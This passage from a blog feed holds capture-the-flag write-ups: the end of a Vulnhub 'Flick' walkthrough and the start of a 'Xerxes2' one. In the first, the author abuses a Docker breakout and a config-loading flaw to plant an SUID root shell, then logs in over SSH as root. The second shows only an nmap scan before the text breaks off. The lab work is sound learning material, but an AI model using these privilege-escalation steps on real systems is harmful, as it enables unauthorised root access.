</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found mnt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found home
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found root
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: root <span class="nv">ino</span><span class="o">=</span>130833
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>root<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .bashrc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .Xauthority
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc <span class="nv">ino</span><span class="o">=</span>138648
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;real_flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found real_flag.txt
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: real_flag.txt <span class="nv">ino</span><span class="o">=</span>165015
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>real_flag.txt<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Got a final handle!
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Win! /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc output follows:
</span><span class='line'>Congrats!
</span><span class='line'>
</span><span class='line'>You have completed <span class="s1">&#39;flick&#39;</span>! I hope you have enjoyed doing it as much as I did creating it
</span><span class='line'>
</span><span class='line'>ciao <span class="k">for</span> now!
</span><span class='line'>@leonjza
</span><span class='line'>
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://stream1.gifsoup.com/webroot/animatedgifs/1024795_o.gif" alt="" /></p>

<hr />

<h2>I&rsquo;m Always After the Bonus Points</h2>

<p>So, on Vulnhub, the text for Flick has this line in it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>As a bonus, can you get root command execution?
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg" alt="challenge_accepted" /></a></p>

<p>Using the aforementioned Docker Container Breakout vulnerability, I read the contents of /opt/start_apache/restart.sh</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>/usr/sbin/service apache2 restart
</span><span class='line'>/usr/bin/supervisorctl restart all
</span></code></pre></td></tr></table></div></figure>


<p>OK, so, it&rsquo;s restarting apache and restarting all processes controlled by Supervisord. Supervisord stores config files in /etc/supervisor/conf.d. Using the Docker vuln to blind enumerate the files, I located /etc/supervisor/conf.d/start_apache.conf which I read</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>[program:start_apache]
</span><span class='line'>command=/opt/start_apache/start.py
</span><span class='line'>process_name = %(program_name)s-80%(process_num)02d
</span><span class='line'>stdout_logfile = /var/log/start_apache-80%(process_num)02d.log
</span><span class='line'>stdout_logfile_maxbytes=100MB
</span><span class='line'>stdout_logfile_backups=10
</span><span class='line'>numprocs=1
</span><span class='line'>directory=/opt/start_apache
</span><span class='line'>stopwaitsecs=1
</span><span class='line'>user=root
</span><span class='line'>stopasgroup=true
</span></code></pre></td></tr></table></div></figure>


<p>/usr/bin/supervisorctl restart all is running /opt/start_apache/start.py. That&rsquo;s the next file I read with the Docker vuln</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">    Simple socket server using threads. Used in the flick CTF</span>
</span><span class='line'><span class="sd">    Credit: http://www.binarytides.com/python-socket-server-code-example/</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">signal</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">thread</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">subprocess</span>
</span><span class='line'>
</span><span class='line'><span class="c"># import the directory containing our config, and prevent the bytcode writes</span>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">dont_write_bytecode</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>
</span><span class='line'><span class="c"># see if /tmp has a configuration to load.</span>
</span><span class='line'><span class="c"># Debugging purposes only!!!</span>
</span><span class='line'><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s">&#39;/tmp/config.py&#39;</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;/tmp&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>  <span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;/etc&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># import the config</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">config</span> <span class="kn">import</span> <span class="n">config</span>
</span><span class='line'>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>   <span class="c"># Symbolic name meaning all available interfaces</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">8881</span> <span class="c"># Arbitrary non-privileged port</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Bind socket to local host and port</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span> <span class="k">as</span> <span class="n">msg</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Bind failed. Error Code : &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="s">&#39; Message &#39;</span> <span class="o">+</span> <span class="n">msg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Start listening on socket</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Function for handling connections. This will be used to create threads</span>
</span><span class='line'><span class="k">def</span> <span class="nf">clientthread</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#Sending message to connected client</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;Welcome to the admin server. A correct password will </span><span class="se">\&#39;</span><span class="s">flick</span><span class="se">\&#39;</span><span class="s"> the switch and open a new door:</span><span class="se">\n</span><span class="s">&gt; &#39;</span><span class="p">)</span> <span class="c">#send only takes string</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#infinite loop so that function do not terminate and thread do not end.</span>
</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>        <span class="c">#Receiving from client</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>        <span class="n">reply</span> <span class="o">=</span> <span class="s">&#39;OK: &#39;</span> <span class="o">+</span> <span class="n">data</span>
</span><span class='line'>        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># check if the password is tabupJievas8Knoj</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s">&#39;tabupJievas8Knoj&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="n">return_code</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">&#39;command&#39;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">return_code</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Accepted! The door should be open now :poolparty:</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Accepted, but it doesn</span><span class="se">\&#39;</span><span class="s">t look like the door opened :&lt;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># add the prompt again</span>
</span><span class='line'>  <span class="n">reply</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&gt; &#39;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">reply</span><span class="p">)</span>
</span><span class='line'>    <span class="c">#came out of loop</span>
</span><span class='line'>    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c">#now keep talking with the client</span>
</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="c">#wait to accept a connection - blocking call</span>
</span><span class='line'>    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c">#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.</span>
</span><span class='line'>    <span class="n">start_new_thread</span><span class="p">(</span><span class="n">clientthread</span> <span class="p">,(</span><span class="n">conn</span><span class="p">,))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>This script is the script that provides the service found on port 8881, and seems to get it&rsquo;s config from /tmp/config.py, and if that doesn&rsquo;t exist, /etc/config.py. I read /etc/config.py to get an idea of the syntax</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="s">&#39;command&#39;</span><span class="p">:</span> <span class="s">&#39;service apache2 restart&#39;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Pretty simple. I can use this to execute a set of commands by creating /tmp/config.py with the following contents - this will take a copy of /bin/sh and put it in /tmp called rootshell, then set the SUID bit.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="s">&#39;command&#39;</span><span class="p">:</span> <span class="s">&#39;cp /bin/sh /tmp/rootshell &amp;&amp; chmod 4777 /tmp/rootshell&#39;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, when I run the /opt/start_apache/restart.sh script, /opt/start_apache/start.py will be run, which will result in /tmp/config.py being read instead of /etc/config.py.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>sudo /opt/start_apache/restart.sh
</span><span class='line'> * Restarting web server apache2                                                                                                                                              apache2: Could not reliably determine the server<span class="s1">&#39;s fully qualified domain name, using 127.0.1.1 for ServerName</span>
</span><span class='line'><span class="s1"> ... waiting apache2: Could not reliably determine the server&#39;</span>s fully qualified domain name, using 127.0.1.1 <span class="k">for</span> ServerName
</span><span class='line'>                                                                                                                                                                       <span class="o">[</span> OK <span class="o">]</span>
</span><span class='line'>start_apache-8000: stopped
</span><span class='line'>start_apache-8000: started
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, we know that typing the correct password runs the command - we know this firstly from the source code, and secondly because we used it to start the web server right at the beginning. All I should need to do is connect to port 8881, and type the correct password. It should then run my malicious command.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 192.168.0.106 8881
</span><span class='line'>Welcome to the admin server. A correct password will <span class="s1">&#39;flick&#39;</span> the switch and open a new door:
</span><span class='line'>&gt; tabupJievas8Knoj
</span><span class='line'>OK: tabupJievas8Knoj
</span><span class='line'>
</span><span class='line'>Accepted! The door should be open now :poolparty:
</span><span class='line'>
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Fingers crossed there&rsquo;s a rootshell file in /tmp</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>ls -l /tmp
</span><span class='line'>total 112
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> robin robin     <span class="m">82</span> Aug <span class="m">12</span> 13:59 config.py
</span><span class='line'>-rwsrwxrwx <span class="m">1</span> root  root  <span class="m">109768</span> Aug <span class="m">13</span> 01:08 rootshell
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, what do you know - it worked ! Running /tmp/rootshell drops us to a root shell, where we can properly read the flag, and put our public key into authorized_keys.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>/tmp/rootshell
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>robin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>robin<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>,1000<span class="o">(</span>robin<span class="o">)</span>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p>And for completeness, an SSH session as root.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh root@192.168.0.106
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo
</span><span class='line'> <span class="m">888</span> <span class="sb">`</span><span class="s2">&quot; `888   `&quot;</span><span class="s1">&#39;            `888</span>
</span><span class='line'><span class="s1">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s1"> 888     888  `888  d88&#39;</span> <span class="sb">`</span><span class="err">&quot;</span>Y8  <span class="m">888</span> .8P<span class="s1">&#39;</span>
</span><span class='line'><span class="s1"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s1"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s1">o888o   o888o o888o `Y8bod8P&#39;</span> o888o o888o
</span><span class='line'>
</span><span class='line'>Welcome to Ubuntu 12.04.4 LTS <span class="o">(</span>GNU/Linux 3.11.0-15-generic x86_64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>  System information as of Wed Aug <span class="m">13</span> 01:11:18 SAST 2014
</span><span class='line'>
</span><span class='line'>  System load:  0.0               Processes:              90
</span><span class='line'>  Usage of /:   39.8% of 6.99GB   Users logged in:        2
</span><span class='line'>  Memory usage: 41%               IP address <span class="k">for</span> eth0:    192.168.0.106
</span><span class='line'>  Swap usage:   1%                IP address <span class="k">for</span> docker0: 172.17.42.1
</span><span class='line'>
</span><span class='line'>  Graph this data and manage this system at:
</span><span class='line'>    https://landscape.canonical.com/
</span><span class='line'>
</span><span class='line'><span class="m">79</span> packages can be updated.
</span><span class='line'><span class="m">51</span> updates are security updates.
</span><span class='line'>
</span><span class='line'>New release <span class="s1">&#39;14.04.1 LTS&#39;</span> available.
</span><span class='line'>Run <span class="s1">&#39;do-release-upgrade&#39;</span> to upgrade to it.
</span><span class='line'>
</span><span class='line'>Last login: Wed Aug <span class="m">13</span> 00:59:56 <span class="m">2014</span> from 192.168.0.110
</span><span class='line'>root@flick:~# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>root@flick:~#
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://gifstumblr.com/images/haters-gonna-hate_1042.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Glory of The Many Demands your Capture or Destruction.]]></title>
    <link href="http://recrudesce.github.io/2014/08/08/the-glory-of-the-many-demands-your-capture-or-destruction/"/>
    <updated>2014-08-08T13:16:46+01:00</updated>
    <id>http://recrudesce.github.io/2014/08/08/the-glory-of-the-many-demands-your-capture-or-destruction</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a long wait, but <a href="http://twitter.com/barrebas">barrebas</a> released <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2 on Vulnhub</a>. I&rsquo;ve not broken into Xerxes1, so I figured what the hell, lets give this a go. It might take me ages, but it&rsquo;s all a learning curve, right ?  Here&rsquo;s how I became the first person to get root</p>

<blockquote>root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)

Yup. [#vulnhub](https://twitter.com/hashtag/vulnhub?src=hash) [#xerxes2](https://twitter.com/hashtag/xerxes2?src=hash) [@barrebas](https://twitter.com/barrebas) [@VulnHub](https://twitter.com/VulnHub)
> 
> &#8211; Russ Watts (@recrudesce) [August 8, 2014](https://twitter.com/recrudesce/statuses/497695207270658048)</blockquote>




<!-- more -->


<h2>Taking a Sneaky Peaky</h2>

<p>Usual stuff here, it makes sense to do some enumeration. The standard route is to start off with an NMAP scan</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 -O --script banner 192.168.0.102
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-04 15:09 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.102
</span><span class='line'>Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">995</span> closed ports
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>22/tcp   open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
</span><span class='line'>80/tcp   open  http
</span><span class='line'>111/tcp  open  rpcbind
</span><span class='line'>4444/tcp open  krb524
</span><span class='line'><span class="p">|</span> banner: //OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSs
</span><span class='line'><span class="p">|</span>_uMDM1ODo9QUNG<span class="se">\x</span>0ASEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKa...
</span><span class='line'>8888/tcp open  sun-answerbook
</span><span class='line'>MAC Address: 08:00:27:FA:1A:A6 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see http://nmap.org/submit/ <span class="o">)</span>.
</span><span class='line'>TCP/IP fingerprint:
